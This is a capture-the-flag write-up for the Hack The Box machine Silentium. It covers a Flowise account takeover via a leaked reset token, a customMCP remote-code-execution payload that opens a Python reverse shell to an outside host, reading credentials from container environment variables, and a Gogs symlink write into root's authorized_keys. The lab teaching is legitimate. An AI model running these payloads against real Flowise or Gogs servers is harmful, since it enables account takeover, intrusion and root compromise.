
# HTB — Silentium Writeup

**Difficulty:** Easy | **OS:** Linux (Ubuntu 24.04) | **IP:** 10.129.18.71

**Completed:** April 12, 2026

**Techniques:** Subdomain Enumeration, CVE-2025-58434, CVE-2025-59528, Docker Escape via Env Creds, Gogs Symlink Privesc

  

---

  

## 🗺️ Cyber Kill Chain Mapping

| Phase                    | Action                                                            |
| ------------------------ | ----------------------------------------------------------------- |
| **Reconnaissance**       | Nmap scan, subdomain fuzzing, main site OSINT                     |
| **Weaponization**        | CVE-2025-58434 password reset exploit, CVE-2025-59528 RCE payload |
| **Delivery**             | HTTP POST to Flowise API endpoints                                |
| **Exploitation**         | Password reset token leak → auth → RCE via customMCP node         |
| **Installation**         | Reverse shell inside Docker container as root                     |
| **C2**                   | Netcat reverse shell on port 9001                                 |
| **Actions on Objective** | Cred extraction from env → SSH as ben → Gogs symlink → root SSH   |


---

  

## 📋 Machine Summary

  

Silentium is an Easy-rated Linux machine themed around a fictional institutional finance firm.

The attack chain involves:

1. Finding a hidden **Flowise AI** subdomain (`staging.silentium.htb`)

2. Exploiting **CVE-2025-58434** (password reset token leaked in API response) to take over the admin account

3. Exploiting **CVE-2025-59528** (RCE via CustomMCP node in Flowise 3.0.5) to get a shell inside Docker

4. Extracting SSH credentials from Docker environment variables

5. Escalating to root by abusing a **Gogs git server symlink attack** to write an SSH key into `/root/.ssh/authorized_keys`

  

---

  

## 🔍 Phase 1: Reconnaissance

  

### Nmap Scan

```bash

nmap -A 10.129.18.71

```

  

**Results:**

- Port 22 — OpenSSH 9.6p1

- Port 80 — nginx 1.24.0 → redirects to `http://silentium.htb/`

  

**Why:** `-A` enables OS detection, version detection, and script scanning in one shot. The redirect tells us the server uses **virtual host routing** — the hostname matters, not just the IP.

  

**Fix /etc/hosts:**

```bash

echo "10.129.18.71 silentium.htb" | sudo tee -a /etc/hosts

```

  

---

  

### Subdomain Enumeration (vhost fuzzing)

```bash

ffuf -u http://silentium.htb \

-H "Host: FUZZ.silentium.htb" \

-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \

-fs 8753 -c

```

  

**Result:** `staging.silentium.htb` (Size: 3142)

  

**Why:** We fuzz the `Host` header — nginx serves different sites based on the hostname. `-fs 8753` filters out the default page size so we only see unique results.

  

```bash

echo "10.129.18.71 staging.silentium.htb" | sudo tee -a /etc/hosts

```

  

---

  

### Staging Site Identification

```bash

curl -s http://staging.silentium.htb | grep -i title

```

  

**Result:** `Flowise - Build AI Agents, Visually`

  

```bash

curl -s http://staging.silentium.htb/api/v1/version

```

  

**Result:** `{"version":"3.0.5"}`

  

**Why this matters:** Flowise 3.0.5 is vulnerable to multiple critical CVEs including a **CVSS 10.0 RCE** (CVE-2025-59528).

  

---

  

### Main Site OSINT

Browsing `http://silentium.htb` reveals the **Leadership/Team section** with three names:

- **Marcus Thorne** — Managing Director

- **Ben** — Head of Financial Systems  (only first name — suspicious)

- **Elena Rossi** — Chief Risk Officer

  

**Key Takeaway:** The person with just a first name (`Ben`) is often the developer/admin. Try `ben@silentium.htb` as a username.

  

---

  

##  Phase 2: Initial Access — Flowise Account Takeover

  

### CVE-2025-58434 — Password Reset Token Disclosure

  

**What it is:** The `/api/v1/account/forgot-password` endpoint returns the password reset token **directly in the HTTP response** instead of sending it by email. Anyone who can call this endpoint can reset any user's password without needing email access.

  

**Why it works:** The server-side code generates the token, saves it to the database, and mistakenly returns the full user object (including `tempToken`) in the API response.

  

```bash

curl -s -X POST 'http://staging.silentium.htb/api/v1/account/forgot-password' \

-H 'Content-Type: application/json' \

-d '{"user": {"email":"ben@silentium.htb"}}' | jq .

```

  

**Response leaks:**

```json

{

"user": {

"email": "ben@silentium.htb",

"tempToken": "4LcYgyPsxYJers4ZP6T2ZaEzaiH2JVypYIcduABWAJg0CYGQPv0C0vuwhP10TQGm",

"tokenExpiry": "2026-04-12T07:18:11.676Z"

}

}

```

  

 **Note:** The token expires in ~15 minutes. Move quickly!

  

---

  

### Reset the Password

  

```bash

cat > /tmp/reset.json << 'EOF'

{

"user": {

"email": "ben@silentium.htb",

"tempToken": "4LcYgyPsxYJers4ZP6T2ZaEzaiH2JVypYIcduABWAJg0CYGQPv0C0vuwhP10TQGm",

"password": "Hacked123!"

}

}

EOF

  

curl -s -X POST 'http://staging.silentium.htb/api/v1/account/reset-password' \

-H 'Content-Type: application/json' \

-d @/tmp/reset.json | jq .

```

  

**Success:** `tempToken` is cleared to `""` and `credential` hash is updated.

  

---

  

### Login to Flowise

  

**Key trick:** The `x-request-from: internal` header is required — without it the login endpoint returns 401.

  

```bash

curl -s -X POST 'http://staging.silentium.htb/api/v1/auth/login' \

-H 'Content-Type: application/json' \

-H 'x-request-from: internal' \

-c cookies.txt \

-d '{"email":"ben@silentium.htb","password":"Hacked123!"}' | jq .

```

  

**Result:** Full admin session cookie saved to `cookies.txt`. Confirmed `isOrganizationAdmin: true`.

  

---

  

##  Phase 3: Remote Code Execution — CVE-2025-59528

  

**What it is:** Flowise 3.0.5 allows authenticated users to execute arbitrary JavaScript through the `customMCP` node type. The `mcpServerConfig` field is passed to Node.js `new Function()` / `exec()` without sanitization, enabling OS command execution.

  

**Why the endpoint is `/node-load-method` (singular):** This is a different internal route from the main API — it handles dynamic node loading and isn't protected the same way.

  

**Start listener:**

```bash

nc -lvnp 9001

```

  

**Fire RCE:**

```bash

cat > /tmp/rce.json << 'EOF'

{

"loadMethod": "listActions",

"inputs": {

"mcpServerConfig": "{\"command\": \"python3\", \"args\": [\"-c\", \"import socket,subprocess,os;s=socket.socket();s.connect(('10.10.17.87',9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])\"]}"

}

}

EOF

  

curl -s -X POST 'http://staging.silentium.htb/api/v1/node-load-method/customMCP' \

-H 'Content-Type: application/json' \

-H 'x-request-from: internal' \

-b cookies.txt \

-d @/tmp/rce.json

```

  

**Result:** Shell received as `root` inside Docker container `c78c3cceb7ba` (172.18.0.3).

  

---

  

##  Phase 4: Docker Escape via Environment Variables

  

**What it is:** Docker containers often receive credentials via environment variables. These are stored in `/proc/1/environ` — readable by root inside the container.

  

```bash

cat /proc/1/environ | tr '�' '

'

```

  

**Key findings:**

```

FLOWISE_USERNAME=ben

FLOWISE_PASSWORD=F1l3_d0ck3r

SENDER_EMAIL=ben@silentium.htb

SMTP_PASSWORD=r04D!!_R4ge

SMTP_HOST=mailhog

```

  

**Why `SMTP_PASSWORD` = SSH password:** The developer reused the same password for both the SMTP service and their Linux account. This is a very common misconfiguration.

  

---

  

##  Phase 5: User Flag

  

```bash

ssh ben@10.129.18.71

# Password: r04D!!_R4ge

  

cat ~/user.txt

# d93622d2[redacted]41296378

```

  

### Internal Port Recon

```bash

ss -tlnp

```

  

Key ports on localhost:

- `:3000` — Flowise (Docker proxied)

- `:3001` — **Gogs** (internal git server) ← PrivEsc target

- `:1025` — MailHog SMTP

- `:8025` — MailHog Web UI

  

---

  

##  Phase 6: Privilege Escalation — Gogs Symlink Attack

  

### What is Gogs?

Gogs is a self-hosted Git service (like GitHub). It's running on port 3001, only accessible from localhost.

  

### Why this works

When Gogs processes a `PUT /contents/<file>` API request to update a file, it writes the content to the file path that the repository entry points to. If that entry is a **symlink**, Gogs follows the symlink and writes to the **target file** instead. Since Gogs runs as root, it can write to `/root/.ssh/authorized_keys`.

  

---

  

### Step 1: Forward Gogs to Kali

```bash

# New terminal on Kali

ssh -L 3001:localhost:3001 ben@10.129.18.71

```

  

### Step 2: Register on Gogs

- Browse to `http://localhost:3001/user/sign_up`

- Create account: `attacker` / `Attacker123!`

- Create repo: `hack` at `http://localhost:3001/repo/create`

  

### Step 3: Create Symlink in Repo (on target as ben)

```bash

cd /tmp

git clone 'http://attacker:Attacker123!@localhost:3001/attacker/hack.git'

cd hack

  

ln -s /root/.ssh/authorized_keys evil # symlink → root's authorized_keys

  

git config user.email "attacker@test.com"

git config user.name "attacker"

git add -f evil

git commit -m "add symlink"

git remote set-url origin 'http://attacker:Attacker123!@localhost:3001/attacker/hack.git'

git push origin master

```

  

`mode 120000` in the commit output confirms it's a proper symlink.

  

### Step 4: Generate SSH Key (on Kali)

```bash

ssh-keygen -t ed25519 -f /tmp/htb_root_key -N "" -q

cat /tmp/htb_root_key.pub

```

  

### Step 5: Create Gogs API Token

```bash

curl -s -X POST 'http://localhost:3001/api/v1/users/attacker/tokens' \

-H 'Content-Type: application/json' \

-u 'attacker:Attacker123!' \

-d '{"name":"pwn"}' | jq .

```

  

### Step 6: Get SHA + Write SSH Key Through Symlink

```bash

GOGS_TOKEN="<YOUR_TOKEN>"

  

SHA=$(curl -s -H "Authorization: token ${GOGS_TOKEN}" \

"http://localhost:3001/api/v1/repos/attacker/hack/contents/evil" | jq -r '.sha')

  

CONTENT_B64=$(cat /tmp/htb_root_key.pub | base64 -w0)

  

curl -s -X PUT -H "Authorization: token ${GOGS_TOKEN}" \

-H "Content-Type: application/json" \

"http://localhost:3001/api/v1/repos/attacker/hack/contents/evil" \

-d "{\"message\":\"pwn\", \"content\":\"${CONTENT_B64}\", \"sha\":\"${SHA}\"}" | jq .

```

  

**Confirmation:** Response shows `"type": "symlink"` with `"target": "/root/.ssh/authorized_keys"` — write successful!

  

### Step 7: SSH as Root

```bash

ssh -i /tmp/htb_root_key root@10.129.18.71

cat /root/root.txt

# b6bb85[redacted]8160201c7

```

  

---

  

##  Flags

  

| Flag | Hash |

|---|---|

| user.txt | `d93622d[redacted]41296378` |

| root.txt | `b6bb852[redacted]160201c7` |

  

---

  

##  Key Takeaways

  

1. **Always fuzz vhosts** — the most interesting attack surface was a hidden subdomain, not the main site

2. **Staging environments are goldmines** — developers deploy internal tools (Flowise, Gogs) on staging subdomains with weaker security

3. **CVE-2025-58434 (Flowise)** — Never return sensitive token data in API responses. The token should be emailed only, never returned to the caller

4. **CVE-2025-59528 (Flowise 3.0.5)** — Never execute user-controlled strings via `new Function()` or `exec()` without strict sandboxing

5. **`x-request-from: internal` header** — Internal headers used as auth bypass indicators are weak security controls — always check for them in black-box testing

6. **Docker env variables** — `/proc/1/environ` is a treasure chest inside Docker containers running as root. Always check it

7. **Password reuse** — The SMTP password was reused as the SSH password, a classic developer mistake

8. **Gogs symlink attack** — Git servers that follow symlinks during file writes (via API) can be abused to write arbitrary files as the git service user. If that user is root, it's game over

9. **Bash `!` in passwords** — Always use single quotes or `set +H` when using passwords containing `!` in bash

  

---

  

##  Tools Used

  

| Tool | Purpose |

|---|---|

| `nmap` | Port scanning & service detection |

| `ffuf` | Subdomain/vhost fuzzing |

| `curl` | API interaction & exploitation |

| `jq` | JSON parsing |

| `nc` | Reverse shell listener |

| `git` | Gogs repo interaction |

| `ssh-keygen` | SSH key generation |

| `base64` | Encoding SSH public key for API |

  

---

  

##  CVE References

  

| CVE | CVSS | Description |

|---|---|---|

| CVE-2025-58434 | 9.8 | Flowise password reset token disclosed in API response |

| CVE-2025-59528 | 10.0 | Flowise RCE via CustomMCP node JS injection (≤ 3.0.5) |
